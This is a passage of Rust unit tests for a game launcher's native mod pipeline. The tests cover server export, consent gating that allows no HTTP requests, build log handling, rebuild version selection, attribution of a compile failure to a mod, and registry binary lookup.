            ("jars/cache.jar", "not a project file"),
        ] {
            let path = project.join(path);
            fs::create_dir_all(path.parent().unwrap()).unwrap();
            fs::write(path, bytes).unwrap();
        }
        let bundle = bundle_in(&project).unwrap().unwrap();
        let binary = dir("server-install").join("built");
        fs::write(&binary, b"modded").unwrap();
        eprintln!("NATIVE_SERVER_EXPORT_STEP=install");
        install(
            base,
            version,
            Target::Server,
            &binary,
            &[],
            &serde_json::json!({"target":"server"}),
            &[bundle],
        )
        .unwrap_or_else(|error| {
            // install's public error is a String. Recover only the numeric std
            // I/O suffix, never its arbitrary message or filesystem paths.
            let code = error
                .rsplit_once("(os error ")
                .and_then(|(_, tail)| tail.strip_suffix(')'))
                .and_then(|number| number.parse::<i32>().ok())
                .unwrap_or(0);
            panic!("NATIVE_SERVER_EXPORT_INSTALL_OS={code}")
        });
        eprintln!("NATIVE_SERVER_EXPORT_STEP=discoverability");
        assert!(!backend::installed().contains(&version.to_string()));
        let cached = Target::Server.directory(version);
        let output = dir("server-independent").join("export");
        eprintln!("NATIVE_SERVER_EXPORT_STEP=export");
        export(&cached, &output).unwrap();
        // install/export retain no files, iterators or compiler/tool children;
        // their synchronous calls have returned before this cache deletion.
        eprintln!("NATIVE_SERVER_EXPORT_STEP=remove_cache");
        fs::remove_dir_all(cached).unwrap_or_else(|error| {
            panic!(
                "NATIVE_SERVER_EXPORT_REMOVE_OS={}",
                error.raw_os_error().unwrap_or(0)
            )
        });
        eprintln!("NATIVE_SERVER_EXPORT_STEP=verify_export");
        assert_eq!(
            fs::read(output.join(Target::Server.binary())).unwrap(),
            b"modded"
        );
        assert_eq!(
            fs::read(output.join(".local/sunrise-client/26.3/facts.json")).unwrap(),
            b"facts"
        );
        assert!(output.join("native-mods.json").is_file());
        eprintln!("NATIVE_SERVER_EXPORT_STEP=remove_project");
        fs::remove_dir_all(project).unwrap_or_else(|error| {
            panic!(
                "NATIVE_SERVER_EXPORT_REMOVE_OS={}",
                error.raw_os_error().unwrap_or(0)
            )
        });
        eprintln!("NATIVE_SERVER_EXPORT_STEP=verify_package");
        let package = output.join(native_dir).join("exported");
        assert_eq!(
            fs::read(package.join("assets/exported/probe.txt")).unwrap(),
            b"asset"
        );
        assert_eq!(
            fs::read(package.join("data/exported/native/probe.json")).unwrap(),
            b"{}"
        );
        assert!(!package.join("jars").exists());
        assert!(!output.join(native_dir).join("stale").exists());
        eprintln!("NATIVE_SERVER_EXPORT_STEP=load_runtime");
        let runtime = sunrise_launcher_smod::packages::adjacent_manifests(
            &output.join(Target::Server.binary()),
        )
        .unwrap();
        eprintln!("NATIVE_SERVER_EXPORT_STEP=verify_runtime");
        let [found] = runtime.as_slice() else {
            panic!("{runtime:?}")
        };
        assert_eq!(found.path, package);
        assert_eq!(
            (
                found.manifest.id.as_str(),
                found.manifest.version.as_str(),
                found.manifest.side
            ),
            (
                "exported",
                "0.1.0",
                sunrise_launcher_smod::manifest::Side::Client
            )
        );
        eprintln!("NATIVE_SERVER_EXPORT_STEP=cleanup");
        let _ = fs::remove_dir_all(source);
        println!("NATIVE_SERVER_EXPORT_COMPLETE");
    }

    /// The export's own gate: an output that already exists is refused before anything is
    /// downloaded or compiled (a base that isn't installed would refuse the build otherwise),
    /// and no instance is edited or version selected.
    #[test]
    fn a_server_build_refuses_an_existing_output_before_building() {
        let _guard = scratch_state();
        backend::Settings::load().allow_native_mods().unwrap();
        let output = dir("server-output");
        let folder = dir("server-mods");
        write_bundle(&folder, "hello", "fn hook() {}");
        let instances_before = instances::list();
        let selected_before = backend::Settings::load().selected;
        let err = build_server(
            "v0.0.0-not-installed",
            &folder,
            &output,
            Some(Profile::Optimized),
            false,
            |_| {},
            |_| false,
        )
        .unwrap_err();
        let err = String::from(err);
        assert!(err.contains("already exists"), "{err}");
        assert!(fs::read_to_string(log_path()).unwrap().contains(&err));
        let managed = root().join("forbidden-export");
        let err = build_server(
            "v0.0.0-not-installed",
            &folder,
            &managed,
            Some(Profile::Optimized),
            false,
            |_| {},
            |_| false,
        )
        .unwrap_err();
        let err = String::from(err);
        assert!(
            err.contains("outside the launcher's managed folders"),
            "{err}"
        );
        assert!(!managed.exists());
        assert_eq!(instances::list(), instances_before, "no instance is edited");
        assert_eq!(
            backend::Settings::load().selected,
            selected_before,
            "no version is selected"
        );
    }

    #[test]
    fn automatic_build_does_not_save_its_effective_profile() {
        let _guard = scratch_state();
        let original = backend::Settings::load();
        backend::Settings::load().allow_native_mods().unwrap();
        let file = backend::data_dir().join("instances.json");
        let previous = fs::read(&file).ok();
        let stored = br#"{"instances":{"sunrise":{"native_profile":"balanced"}}}"#;
        fs::write(&file, stored).unwrap();
        let instance = instances::find("sunrise").unwrap();
        let folder = dir("automatic-profile");
        let error = build(
            "v2099.09.09",
            &folder,
            &instance,
            None,
            false,
            |_| {},
            |_| false,
        )
        .unwrap_err();
        assert!(String::from(error).contains("is not prepared yet"));
        assert_eq!(fs::read(&file).unwrap(), stored);
        if let Some(previous) = previous {
            fs::write(file, previous).unwrap();
        } else {
            fs::remove_file(file).unwrap();
        }
        fs::remove_dir_all(folder).unwrap();
        original.save().unwrap();
    }

    #[test]
    fn a_check_without_a_route_is_a_tool_too_old_and_refusals_name_their_mod() {
        let reply = |route: &str| -> tool::Checked {
            serde_json::from_str(&format!(
                r#"{{"contract":2,{route}"mods":[{{"id":"scripted","refusal":"build scripts aren't allowed"}},{{"id":"fine","verdict":{{"kind":"made-for"}}}}]}}"#
            ))
            .unwrap()
        };
        let older = checks_from(reply(""), &["scripted", "fine"]).err().unwrap();
        assert!(older.contains("too old"), "{older}");
        let checks =
            checks_from(reply(r#""route":"prebuilt-api","#), &["scripted", "fine"]).unwrap();
        assert_eq!(checks.route, "prebuilt-api");
        assert!(matches!(&checks.verdicts[..], [(id, fit::Verdict::MadeFor)] if id == "fine"));
        let [(id, text)] = &checks.refusals[..] else {
            panic!("{:?}", checks.refusals)
        };
        assert_eq!(id, "scripted");
        assert!(
            text.contains("scripted") && text.ends_with("build scripts aren't allowed"),
            "{text}"
        );
    }

    #[test]
    fn folder_planning_reuses_the_build_snapshot_without_restaging_packages() {
        let _guard = scratch_state();
        let original = backend::Settings::load();
        backend::Settings::load().allow_native_mods().unwrap();
        let folder = dir("profile-snapshot");
        write_bundle(&folder, "snapshot", "");
        fs::write(
            folder.join("Cargo.toml"),
            "[package]\nname='snapshot'\nversion='0.1.0'\n[dependencies]\nsunrise-client='0.1'\n",
        )
        .unwrap();
        let preview = root().join("installed.routes");
        fs::create_dir_all(&preview).unwrap();
        let sentinel = preview.join("snapshot-sentinel");
        fs::write(&sentinel, b"retained").unwrap();
        let lease = crate::native_cache::Cache::acquire(&backend::build_dir()).unwrap();
        // Its refusal is the SDK tool's to say (`native-check`); without an installed base none is asked.
        let routes = planning::classify(&folder, None, &lease).unwrap();
        assert!(
            matches!(&routes.mods[..], [(id, Route::Unchecked { reason })]
                if id == "snapshot" && reason.contains("Install Sunrise first")),
            "{routes:?}"
        );
        assert_eq!(fs::read(&sentinel).unwrap(), b"retained");
        fs::remove_file(sentinel).unwrap();
        fs::remove_dir_all(folder).unwrap();
        original.save().unwrap();
    }

    #[test]
    fn missing_consent_blocks_all_build_routes_before_http_or_staging() {
        use std::net::TcpListener;
        let _guard = scratch_state();
        let original = backend::Settings::load();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        fs::create_dir_all(backend::data_dir()).unwrap();
        fs::write(backend::data_dir().join("settings.json"), serde_json::json!({"native_warning": true, "proxy": format!("http://{}", listener.local_addr().unwrap())}).to_string()).unwrap();
        let folder = dir("consent-missing");
        let output = folder.join("export");
        let log_before = fs::read(log_path()).ok();
        fn denied<T>(result: Result<T, Failed>) {
            assert!(matches!(result, Err(Failed::NoConsent)));
        }
        let profile = Profile::Optimized;
        let base = "uninstalled";
        denied(build_server(
            base,
            &folder,
            &output,
            Some(profile),
            false,
            |_| {},
            |_| false,
        ));
        for choice in [Some(profile), None] {
            denied(build(
                base,
                &folder,
                &instances::selected(),
                choice,
                false,
                |_| {},
                |_| false,
            ));
        }
        denied(sync_internals(&folder));
        let expected = require_consent().unwrap_err().to_string();
        assert_eq!(
            catalog(&folder, &folder.join("catalog")).unwrap_err(),
            expected
        );
        let preview = root().join("installed.routes");
        fs::create_dir_all(&preview).unwrap();
        let marker = preview.join("permission-sentinel");
        fs::write(&marker, b"unchanged").unwrap();
        denied(routes(&folder, None));
        assert_eq!(
            fs::read(&marker).unwrap(),
            b"unchanged",
            "preview never stages before consent"
        );
        fs::remove_file(marker).unwrap();
        assert!(
            matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock),
            "zero HTTP requests"
        );
        assert!(!output.exists());
        assert_eq!(
            fs::read(log_path()).ok(),
            log_before,
            "no build staging or log writes"
        );
        backend::Settings::load().allow_native_mods().unwrap();
        assert!(backend::Settings::load().native_mods_allowed_at.is_some());
        require_consent().unwrap();
        original.save().unwrap();
    }

    /// The build log ([`clear_log`], [`append_log`]): fresh for every attempt, and an early
    /// failure (before any command ran) recorded in it, in one test because they share the
    /// one log file.
    #[test]
    fn the_log_is_fresh_per_attempt_and_keeps_early_failures() {
        let _guard = scratch_state();
        backend::Settings::load().allow_native_mods().unwrap();
        clear_log().unwrap();
        append_log("the last build's output").unwrap();
        clear_log().unwrap();
        assert_eq!(fs::read(log_path()).unwrap(), b"");
        append_log("a line").unwrap();
        append_log("another").unwrap();
        assert_eq!(fs::read_to_string(log_path()).unwrap(), "a line\nanother\n");
        // A build that fails before anything runs empties the old log and says why.
        let folder = dir("log-early");
        write_bundle(&folder, "hello", "fn hook() {}");
        let out = dir("log-early-out");
        let err = build_server(
            "v0.0.0-not-installed",
            &folder,
            &out.join("server"),
            Some(Profile::Optimized),
            false,
            |_| {},
            |_| false,
        )
        .unwrap_err();
        let err = String::from(err);
        assert!(err.contains("is not prepared yet"), "{err}");
        let log = fs::read_to_string(log_path()).unwrap();
        assert!(log.contains("is not prepared yet"), "{log}");
        assert!(!log.contains("the last build's output"), "{log}");
        // A failure after compiler output keeps those diagnostics and the final reason.
        let failure: Result<(), String> = logged(|_| {
            append_log("error[E0425]: cannot find value `missing` in this scope")?;
            Err("Could not export the engine".into())
        });
        assert!(failure.is_err());
        let log = fs::read_to_string(log_path()).unwrap();
        assert!(log.starts_with("error[E0425]"), "{log}");
        assert!(
            log.ends_with("The build failed: Could not export the engine\n"),
            "{log}"
        );
        assert!(!log.contains("Build completed."), "{log}");
        let success: Result<(), String> = logged(|_| Ok(()));
        success.unwrap();
        let log = fs::read_to_string(log_path()).unwrap();
        assert!(log.ends_with("Build completed.\n"), "{log}");
        assert!(!log.contains("error[E0425]"), "{log}");
        assert!(!log.contains("The build failed:"), "{log}");
    }

    /// levzzz5154's decision (2026-10-29): a rebuild stays on the Sunrise the instance plays;
    /// only an update (`--update`, `base_for`'s `update`) moves it to a newer one.
    #[test]
    fn a_rebuild_stays_on_the_instances_sunrise_until_an_update() {
        let installed: Vec<String> = [
            "nightly-2026-10-29-4baa571",
            "v2026.10.20",
            "native-83f15fa-0123456789ab",
            "v2026.10.13",
        ]
        .map(String::from)
        .to_vec();
        let base = |current: Option<&str>, update| base_for(current, &installed, update);
        let native = "native-83f15fa-0123456789ab";
        assert_eq!(base(Some(native), false).as_deref(), Some(native));
        assert_eq!(
            base(Some("v2026.10.13"), false).as_deref(),
            Some("v2026.10.13")
        );
        let newest = Some("nightly-2026-10-29-4baa571");
        assert_eq!(base(Some(native), true).as_deref(), newest);
        assert_eq!(base(None, false).as_deref(), newest);
        assert_eq!(base(Some("native-gone"), false).as_deref(), newest);
        assert_eq!(base_for(Some(native), &[native.into()], true), None);
        // Update offers the newest release or Nightly, when newer than the build's own.
        assert_eq!(newer_than("v2026.10.20", &installed).as_deref(), newest);
        assert_eq!(newer_than("nightly-2026-10-29-4baa571", &installed), None);
        let releases = ["v2026.10.20".to_string(), "v2026.10.13".to_string()];
        assert_eq!(newer_than("v2026.10.20", &releases), None);
        assert_eq!(
            newer_than("v2026.10.13", &releases).as_deref(),
            Some("v2026.10.20")
        );
    }

    #[test]
    fn a_mods_own_compile_failure_is_traced_to_that_mod() {
        let ids = ["greeter".to_owned(), "fast-ore".to_owned()];
        let error = failure(
            &compiling_mod("fast-ore"),
            "exit status: 101",
            &["error[E0425]: cannot find value `speed`".into()],
            &[],
        );
        assert_eq!(compile_failed_mod(&error, &ids), Some(&ids[1]));
        let game = failure("Compiling the game", "exit status: 101", &[], &[]);
        assert_eq!(compile_failed_mod(&game, &ids), None);
    }

    #[test]
    fn the_tools_blamed_mod_reads_in_the_launchers_words_whatever_its_text() {
        let ids = vec!["fast-ore".to_string(), "maps".to_string()];
        let blamed = |kind| tool::Failure {
            error: "a message in the tool's English".into(),
            blame: Some(tool::Blame {
                mod_id: "maps".into(),
                kind,
            }),
        };
        let compiled = blamed_text(blamed(tool::BlameKind::Compile));
        assert_eq!(compile_failed_mod(&compiled, &ids), Some(&ids[1]));
        assert!(compiled.ends_with("a message in the tool's English"));
        let refused = blamed_text(blamed(tool::BlameKind::Features));
        assert!(
            matches!(refused_mod(&refused, &ids), Some((id, Refusal::Features { .. })) if id == "maps")
        );
        let none = blamed_text(tool::Failure::from("no mod named".to_string()));
        assert_eq!(
            (
                compile_failed_mod(&none, &ids),
                refused_mod(&none, &ids).is_none()
            ),
            (None, true)
        );
    }
}

#[cfg(test)]
mod registry_binary_tests {
    #[test]
    fn source_preparation_lookup_requires_exact_build_and_target() {
        let index = sunrise_launcher_smod::index::Index::parse(include_str!(
            "../crates/smod/tests/index/index-v1.json"
        ))
        .unwrap();
        let mut version = index.project("coords_hud").unwrap().versions[0].clone();
        version.native_binaries = vec![sunrise_launcher_smod::index::NativeBinary {
            build: "exact-build".into(),
            target: "aarch64-apple-darwin".into(),
            file: version.file.clone(),
        }];
        assert_eq!(
            version
                .native_binary("exact-build", "aarch64-apple-darwin")
                .unwrap()
                .file
                .name,
            "coords_hud-0.1.0.smod"
        );
        assert!(version
            .native_binary("other-build", "aarch64-apple-darwin")
            .is_err());
        assert!(version
            .native_binary("exact-build", "x86_64-apple-darwin")
            .is_err());
        version.native_binaries.clear();
        assert!(version
            .native_binary("exact-build", "aarch64-apple-darwin")
            .is_err());
    }
}

#[cfg(all(test, unix))]
#[path = "native_mods/tests/runtime_leases.rs"]
mod runtime_leases_tests;
